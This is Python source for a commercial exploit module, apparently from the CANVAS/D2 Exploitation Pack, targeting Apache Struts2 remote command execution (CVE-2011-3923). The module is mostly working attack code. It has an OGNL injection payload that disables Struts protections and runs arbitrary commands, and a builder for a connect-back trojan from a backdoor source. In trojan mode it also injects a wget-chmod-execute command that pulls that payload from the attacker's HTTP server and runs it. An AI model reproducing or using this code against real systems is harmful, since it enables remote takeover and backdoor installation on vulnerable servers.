#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2011
#

import sys, time, os, thread

sys.path.append(".")
sys.path.append("../../")

import canvasengine

from exploitutils import *
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from libs.spkproxy import header, body
from libs.canvasos import *
import StringIO
import urllib

NAME = "d2sec_struts3"
VERSION = "0.1"
DESCRIPTION = "Apache Struts2 remote command execution vulnerability"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [["Linux"]]

DOCUMENTATION = {}
DOCUMENTATION["Versions Affected"] = "< 2.3.1.1"
DOCUMENTATION["Date public"] = "2012/01/22"
DOCUMENTATION["References"] = "http://blog.o0o.nu/2012/01/cve-2011-3923-yet-another-struts2.html"
DOCUMENTATION["CVE Name"] = "CVE-2011-3923"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3923"

NOTES = """
Usage:

-- Single command mode --
./3rdparty/D2SEC/d2sec_struts3/d2sec_struts3.py -t 172.16.244.141 -p 8080 -O uri:"/struts2-blank/example/Login.action" -O cmd:"mkdir /tmp/pwned" -O param:"username"

-- Automatic MOSDEF trojan download and exec for Linux --
./commandlineInterface.py -p 5555 -v 3
./3rdparty/D2SEC/exploits/d2sec_struts3/d2sec_struts3.py -t 172.16.244.141 -p 8080 -l 172.16.244.143 -d 5555 -O uri:"/struts2-blank/example/Login.action" -O param:"username"
"""

DOCUMENTATION["Notes"] = NOTES

class theexploit (tcpexploit):
    
  def __init__(self):
    tcpexploit.__init__(self)
    self.TROJANMODE = 0
    self.host = '' 
    self.port = 8080 
    self.cmd = ''
    self.param = 'username'
    self.uri = '/struts2-blank/example/Login.action?%s=' % self.param
    self.name = NAME
    self.trojanname = 'mosdef'
	
  def neededListenerTypes(self):
    return [canvasengine.LINUXMOSDEF_INTEL]

  def maketrojan(self):
    t_os = canvasos('Linux')
    t_os.arch = "X86"
    from MOSDEF import makeexe
    from MOSDEF.cc import threadsafe_cc_main
    self.log('[D2] Compiling Unix trojan')
    infilename = "backdoors/cback_mmap_rwx.c"
    vars = {}
    vars['CBACK_PORT'] = self.callback.port
    vars['CBACK_ADDR'] = str2int32(socket.inet_aton(self.callback.ip))
    self.log('[D2] Callback address is %s' % vars['CBACK_ADDR'])
    cc_command = []
    for var in vars:
      cc_command += ["-D","%s=%s"%(var,vars[var])]
    cc_command += ["-d", "-v","-m","Linux" ,"-p", "i386","-k", "None", infilename]
    self.log('[D2] CC command: %s"%cc_command')
    mosdeftrojan = threadsafe_cc_main(cc_command)
    if not mosdeftrojan:
      self.log('[D2] Was unable to create trojan!')
      return ''
    self.log('[D2] Length of CC compiled trojan: %s' % len(mosdeftrojan))
    self.log('[D2] Writing out %d bytes to %s' % (len(mosdeftrojan), self.trojanname))
    file(self.trojanname, "wb").write(mosdeftrojan)
    ret = len(mosdeftrojan) != 0
    return ret

  def makesploit(self, clientheader, clientbody):
    from libs.spkproxy import header, body
    h = header('SERVER')
    b = body()
    self.maketrojan()
    if clientheader.URL.count(self.trojanname):
      self.log("Sending MOSDEF trojan")
      f = open(self.trojanname, "rb")
      sploitstring = f.read()
      f.close()
      os.remove(self.trojanname)
      self.log("Sending %d bytes"%len(sploitstring))
      h.addHeader("Content-type","binary/octet-stream")
      h.addHeader("Connection","close")
      b.setBody(sploitstring)
    return h, b


  #################################################################################################################
  # Code from httpserver.py
  def listen(self):
    s = self.gettcplistener(80, "0.0.0.0")
    if not s:
      if self.port < 1024:
        self.log('[D2] Cannot listen on port %d - perhaps we need to be root or that port is already bound? ' \
          'you can try to bind to a higher port' % self.port)
      else:
        self.log('[D2] Cannot listen on port %d - perhaps that port is already bound ?' % self.port)
        return 0
    s.set_timeout(5)
    self.s = s
    return s

  def accept(self, s=None):
    """
      Try to accept one connection
      returns true if we found one
    """
    #we loop on this ,so no annoying printouts here
    #self.log("Accepting connection")
    if s == None:
      s = self.s
    try:
      infd,addr = s.accept()
    #except timeoutsocket.Timeout:
    except Exception, e:
      #self.log("Timed out - no accept yet")
      return
    if infd == -1:
      return
    #else we have an infd
    self.handle(infd)
    return True #handled connection

  def handle(self, infd):
    self.log('[D2] Handling connection')
    clientheader = header(state = "SERVER")
    clientheader.ssl = self.ss
    ret = clientheader.readdata(infd)
    clientbody = body()
    if clientheader.gotGoodHeader():
      if clientheader.bodySize()>0 or clientheader.wasChunked:
        self.log('[D2] Reading body')
        clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
        self.log('[D2] Read body')
    self.log('[D2] Creating exploit response')
    servheader,servbody = self.makesploit(clientheader,clientbody)
    self.log('[D2] Responding')
    bodydata = ''.join(servbody.data)
    #now we respond...
    response = ''
    response += '%s %s %s\r\n' % (servheader.version, servheader.status, servheader.msg)
    #self.log(response)
    for akey in servheader.headerValuesDict.keys():
      if akey not in [ "Content-Length", "Content-length"]:
        response += servheader.grabHeader(akey)
    self.log('[D2] Sending header data of %d bytes' % len(response))
    chunked = 0 #for now, eventually we'll send random chunks down the pipe.\..
    if not chunked:
      response += 'Content-Length: '+str(len(bodydata))+'\r\n'
    response += '\r\n'
    response += ''.join(bodydata)
    self.log('[D2] Total response length is %d bytes' % len(response))
    try:
      infd.sendall(response)
    except socket.error:
      self.log('[D2] Connection closed by peer')
    self.log('[D2] Response sent')
    infd.close() #connection close - later on we'll keep it.
    return
  #
  #################################################################################################################

  def startHTTPServer(self):
    s = self.listen()
    if not s:
      self.log('[D2] Failed to listen - not running')
      return 0
    while 1:
      if self.state == self.HALT:
        self.s.close()
        break
      self.accept()
    return 1

  def _struts_remote_exec(self, command):
    content = StringIO.StringIO()
    try:
      import pycurl
    except Exception, e:
      self.log('[D2] %s' % e)
      self.log('[D2] Install module python-pycurl')
      return 0
    request = ''
    request += 'http://%s:%d' % (self.host, self.port)
    request += self.uri
    request += "%28%23context[\"xwork.MethodAccessor.denyMethodExecution\"]%3D"
    request += "+new+java.lang.Boolean%28false%29,%20%23_memberAccess[\"allowStaticMethodAccess\"]%3d"
    request += "+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27"
    request += "CMD%27%29%29%28meh%29&z[%28PARAM%29%28%27meh%27%29]=true"
    command = urllib.quote(command)
    request = request.replace('CMD', command)
    request = request.replace('PARAM', self.param)
    try:
      c = pycurl.Curl()
      c.setopt(pycurl.URL, '%s' % request)
      c.setopt(c.WRITEFUNCTION, content.write)
      c.setopt(c.TIMEOUT, 15)
      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
      c.perform()
      c.close()
    except Exception, e:
      self.log('[D2] %s' % e)
      return ''

  def struts_remote_exec(self):
    if ';' in self.cmd:
      commands = self.cmd.split(';')
      for command in commands:
        self.log('[D2] Execute \"%s\"' % command)
        self._struts_remote_exec(command)
        time.sleep(5)
    else:
      self._struts_remote_exec(self.cmd) 
      self.log('[D2] Execute \"%s\"' % self.cmd)
    
  def getargs(self):	
    self.host = self.target.interface
    self.port = int(self.argsDict.get("port",self.port))
    self.uri = self.argsDict.get("uri",self.uri)
    self.param = self.argsDict.get("param",self.param)
    if (self.argsDict.get("cmd", self.cmd) == ''):
      self.TROJANMODE = 1
      self.cmd = 'wget -O /tmp/%s %s/%s; chmod +x /tmp/%s; /tmp/%s' % (self.trojanname, self.callback.ip, self.trojanname, self.trojanname, self.trojanname)
      thread.start_new_thread(self.startHTTPServer,())
    else:
      self.cmd = self.argsDict.get("cmd", self.cmd)

  def run(self):
    self.getargs()
    self.setInfo('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
    self.log('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
    time.sleep(5)
    if (self.TROJANMODE == 1):
      self.log('[D2] Create, download and execute Linux mosdef payload')
    self.struts_remote_exec()
    if (self.TROJANMODE == 1):
      #self.log('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
      #self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
      while 1:
        time.sleep(1)
    self.log('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
    return 1

  def usage(self):
    print "Usage: "+sys.argv[0]+" -t target [-p port:8080] -l localip -d localport -O uri:<uri> -O cmd:<command> -O param:<value>" 
    print "If cmd parameter is null, a Linux mosdef payload will be used."
    sys.exit(0)
    
if __name__ == '__main__':
  print "Running CANVAS %s v %s" % (NAME,VERSION)
  app = theexploit()
  ret = standard_callback_commandline(app)
